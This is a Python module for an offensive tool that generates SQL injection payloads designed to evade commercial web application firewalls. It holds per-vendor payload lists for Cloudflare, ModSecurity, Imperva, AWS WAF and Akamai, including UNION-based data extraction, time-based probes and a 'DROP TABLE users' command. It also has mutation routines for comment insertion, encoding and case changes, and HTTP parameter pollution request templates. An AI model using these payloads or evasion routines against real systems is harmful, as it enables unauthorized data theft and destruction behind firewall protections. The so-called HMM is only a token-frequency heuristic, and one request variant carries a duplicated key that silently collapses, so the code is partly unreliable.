"""HMM-based WAF evader for ML-aware bypass payload generation."""

from __future__ import annotations

import math
import random
import re
from collections import Counter
from dataclasses import dataclass, field
from typing import Any

COMMUNITY_WAF_PAYLOADS: dict[str, list[str]] = {
    "cloudflare": [
        "UNION SELECT NULL,NULL,NULL--",
        "' OR '1'='1' --+",
        "admin'--",
        "1' OR 1=1#",
        "' UNION SELECT user(),database(),version()--",
        "1' AND 1=1--",
        "admin'/*",
        "' OR ''='",
        "1' WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "admin'-- -",
        "' OR EXISTS(SELECT * FROM users)--",
        "1' UNION SELECT NULL,NULL,NULL,NULL--",
        "' AND 1=1#",
        "admin' OR '1'='1",
        "' OR 1=1 LIMIT 1--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' OR benchmark(1000000,MD5('test'))--",
        "admin'#",
        "' AND 1=2 UNION SELECT NULL--",
    ],
    "modsecurity": [
        "UNION SELECT NULL,NULL--",
        "' OR 1=1--",
        "1' OR 'a'='a",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "1; DROP TABLE users--",
        "' OR ''='",
        "1' AND 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'/*",
        "' OR 1=1#",
        "1' WAITFOR DELAY '0:0:1'--",
        "' AND SLEEP(1)--",
        "admin' OR '1'='1",
        "' OR EXISTS(SELECT 1)--",
        "1' UNION SELECT table_name FROM information_schema.tables--",
        "' OR benchmark(500000,MD5('x'))--",
        "admin'#",
        "' AND 1=2--",
        "1' OR 1=1 LIMIT 1--",
    ],
    "imperva": [
        "UNION SELECT ALL NULL,NULL--",
        "' OR 1=1/*",
        "1' OR '1'='1'#",
        "admin'--",
        "' UNION SELECT 1,@@version--",
        "1; SELECT 1--",
        "' OR ''='' --",
        "1' AND 1=1--",
        "' UNION SELECT NULL,user()--",
        "admin'/*",
        "' OR 1=1#",
        "1' SLEEP(3)--",
        "' AND BENCHMARK(1000000,MD5('a'))--",
        "admin' OR '1'='1'#",
        "' OR EXISTS(SELECT * FROM information_schema.tables)--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",
        "' OR benchmark(500000,SHA1('test'))--",
        "admin'#",
        "' AND 1=2 UNION SELECT NULL--",
        "1' OR 1=1 LIMIT 1--",
    ],
    "aws_waf": [
        "UNION SELECT NULL,NULL,NULL,NULL--",
        "' OR 1=1-- -",
        "1' OR '1'='1' --",
        "admin'--",
        "' UNION SELECT 1,user(),version(),database()--",
        "1; SELECT SLEEP(1)--",
        "' OR ''=''#",
        "1' AND 1=1--",
        "' UNION SELECT NULL,NULL--",
        "admin'/*",
        "' OR 1=1#",
        "1' SLEEP(2)--",
        "' AND BENCHMARK(1000000,MD5('x'))--",
        "admin' OR '1'='1' --",
        "' OR EXISTS(SELECT * FROM users)--",
        "1' UNION SELECT table_name,column_name FROM information_schema.columns--",
        "' OR benchmark(500000,MD5('test'))--",
        "admin'#",
        "' AND 1=2 UNION SELECT NULL--",
        "1' OR 1=1 LIMIT 1--",
    ],
    "akamai": [
        "UNION SELECT NULL,NULL--",
        "' OR 1=1--",
        "1' OR 'x'='x",
        "admin'--",
        "' UNION SELECT 1,2--",
        "1; WAITFOR DELAY '0:0:1'--",
        "' OR ''=''",
        "1' AND 1=1--",
        "' UNION SELECT NULL,user()--",
        "admin'/*",
        "' OR 1=1#",
        "1' SLEEP(5)--",
        "' AND BENCHMARK(100000,MD5('a'))--",
        "admin' OR '1'='1'#",
        "' OR EXISTS(SELECT 1)--",
        "1' UNION SELECT table_name FROM information_schema.tables--",
        "' OR benchmark(500000,MD5('test'))--",
        "admin'#",
        "' AND 1=2--",
        "1' OR 1=1 LIMIT 1--",
    ],
}


@dataclass(slots=True)
class HMMWafEvader:
    """HMM-based WAF evasion engine.

    Models a WAF as a 2-state HMM (safe, blocked) where emission
    probabilities are learned from token frequencies in known-clean
    HTML (positive) and WAF block-page tokens (negative).
    """

    waf_fingerprint: dict[str, Any] = field(default_factory=dict)
    _token_counter: Counter = field(default_factory=Counter, repr=False)
    _block_token_counter: Counter = field(default_factory=Counter, repr=False)
    _vocab: list[str] = field(default_factory=list, repr=False)
    _safe_probs: dict[str, float] = field(default_factory=dict, repr=False)
    _block_probs: dict[str, float] = field(default_factory=dict, repr=False)
    _transition_safe: float = 0.7
    _transition_block: float = 0.3

    def _tokenize(self, text: str) -> list[str]:
        tokens = re.findall(r"[a-zA-Z0-9_]+", text.lower())
        return tokens if tokens else [text[:20]]

    def train(self, clean_samples: list[str], block_samples: list[str]) -> None:
        """Fit HMM parameters from labeled HTML samples.

        Args:
            clean_samples: HTML pages that pass the WAF unchanged.
            block_samples: WAF block-page HTML tokens.
        """
        safe_tokens: list[str] = []
        block_tokens: list[str] = []

        for sample in clean_samples:
            safe_tokens.extend(self._tokenize(sample))

        for sample in block_samples:
            block_tokens.extend(self._tokenize(sample))

        self._token_counter = Counter(safe_tokens)
        self._block_token_counter = Counter(block_tokens)

        all_tokens = set(safe_tokens) | set(block_tokens)
        self._vocab = sorted(all_tokens)

        total_safe = sum(self._token_counter.values()) or 1
        total_block = sum(self._block_token_counter.values()) or 1

        vocab_size = len(self._vocab) or 1
        alpha = 1.0

        self._safe_probs = {}
        self._block_probs = {}

        for token in self._vocab:
            self._safe_probs[token] = (self._token_counter.get(token, 0) + alpha) / (
                total_safe + alpha * vocab_size
            )
            self._block_probs[token] = (self._block_token_counter.get(token, 0) + alpha) / (
                total_block + alpha * vocab_size
            )

        safe_count = len(clean_samples) or 1
        block_count = len(block_samples) or 1
        total = safe_count + block_count
        self._transition_safe = safe_count / total
        self._transition_block = block_count / total

    def _safe_score(self, text: str) -> float:
        tokens = self._tokenize(text)
        if not tokens:
            return 0.0
        log_prob = 0.0
        for token in tokens:
            p = self._safe_probs.get(token, 1.0 / (len(self._vocab) + 1))
            log_prob += math.log(max(p, 1e-12))
        return log_prob / len(tokens)

    def _block_score(self, text: str) -> float:
        tokens = self._tokenize(text)
        if not tokens:
            return 0.0
        log_prob = 0.0
        for token in tokens:
            p = self._block_probs.get(token, 1.0 / (len(self._vocab) + 1))
            log_prob += math.log(max(p, 1e-12))
        return log_prob / len(tokens)

    def generate_payloads(self, base_payload: str, n: int = 50) -> list[str]:
        """Generate payloads that match the WAF's learned safe distribution.

        Args:
            base_payload: Original payload to mutate.
            n: Number of payloads to generate.

        Returns:
            List of mutated payload strings.
        """
        if not self._vocab:
            return [base_payload] * n

        results: list[str] = []
        safe_tokens_sorted = sorted(
            self._vocab,
            key=lambda t: self._safe_probs.get(t, 0.0),
            reverse=True,
        )
        top_safe = safe_tokens_sorted[: max(1, len(safe_tokens_sorted) // 4)]

        base_chars = list(base_payload)
        for _ in range(n):
            mutated = list(base_chars)
            strategy = random.choice(["insert", "replace", "comment", "encode", "split"])

            if strategy == "insert" and top_safe:
                insert_token = random.choice(top_safe)
                pos = random.randint(0, len(mutated))
                mutated.insert(pos, insert_token[0])

            elif strategy == "replace":
                idx = random.randint(0, len(mutated) - 1)
                if mutated[idx].isalpha():
                    mutated[idx] = mutated[idx].upper() if random.random() < 0.5 else mutated[idx].lower()

            elif strategy == "comment":
                comment_pairs = [
                    ("/**/", "/*", "*/"),
                    ("<!--", "<!--", "-->"),
                    ("#", "#", ""),
                    ("--", "--", ""),
                ]
                _, open_c, close_c = random.choice(comment_pairs)
                pos = random.randint(0, len(mutated))
                mutated.insert(pos, open_c)
                if close_c:
                    mutated.insert(pos + 2, close_c)

            elif strategy == "encode":
                if random.random() < 0.5:
                    mutated = [
                        f"%{ord(c):02x}" if random.random() < 0.3 and c.isalnum() else c
                        for c in mutated
                    ]
                else:
                    mutated = [c.upper() if c.isalpha() and random.random() < 0.5 else c for c in mutated]

            elif strategy == "split" and len(mutated) > 3:
                pos = random.randint(1, len(mutated) - 1)
                mutated = mutated[:pos] + ["+", " ", "/**/"] + mutated[pos:]

            results.append("".join(mutated))

        unique = list(dict.fromkeys(results))
        while len(unique) < n:
            unique.append(base_payload)
        return unique[:n]

    def hpp_bypass(self, payload: str, param_name: str) -> list[dict[str, Any]]:
        """HTTP Parameter Pollution variants.

        Sends the payload in both the query string and the request body
        simultaneously under the same and overridden parameter names.

        Args:
            payload: The injection payload to deliver.
            param_name: Target parameter name.

        Returns:
            List of HPP request specification dicts.
        """
        encoded_payload = payload.replace("'", "%27").replace(" ", "%20")
        variants = [
            {
                "method": "GET",
                "params": {param_name: encoded_payload},
                "headers": {},
                "description": "HPP: payload in query string only",
            },
            {
                "method": "POST",
                "params": {},
                "body_params": {param_name: payload},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "description": "HPP: payload in body only",
            },
            {
                "method": "POST",
                "params": {param_name: "safe_value"},
                "body_params": {param_name: payload},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "description": "HPP: safe value in query, payload in body",
            },
            {
                "method": "POST",
                "params": {param_name: payload},
                "body_params": {param_name: "safe_value"},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "description": "HPP: payload in query, safe value in body",
            },
            {
                "method": "POST",
                "params": {param_name: encoded_payload, f"{param_name}[]": payload},
                "body_params": {},
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "description": "HPP: duplicate param with array notation",
            },
            {
                "method": "GET",
                "params": {
                    param_name: encoded_payload,
                    param_name: encoded_payload,
                },
                "headers": {},
                "description": "HPP: duplicate query param (server takes last)",
            },
        ]
        return variants

    def per_waf_payloads(self, waf_name: str) -> list[str]:
        """Community bypass payloads modeled on swadhwa/awesome-waf.

        Args:
            waf_name: Normalized WAF name (e.g. 'cloudflare', 'modsecurity').

        Returns:
            List of community-sourced bypass payloads for the given WAF.
        """
        key = waf_name.lower().replace(" ", "").replace("-", "")
        mapping = {
            "cloudflare": "cloudflare",
            "cloudflarepremium": "cloudflare",
            "cloudflarepro": "cloudflare",
            "modsecurity": "modsecurity",
            "mod_security": "modsecurity",
            "modsec": "modsecurity",
            "imperva": "imperva",
            "incapsula": "imperva",
            "awswaf": "aws_waf",
            "aws": "aws_waf",
            "aws_waf": "aws_waf",
            "akamai": "akamai",
            "akamaikona": "akamai",
        }
        resolved = mapping.get(key, key)
        return list(COMMUNITY_WAF_PAYLOADS.get(resolved, []))
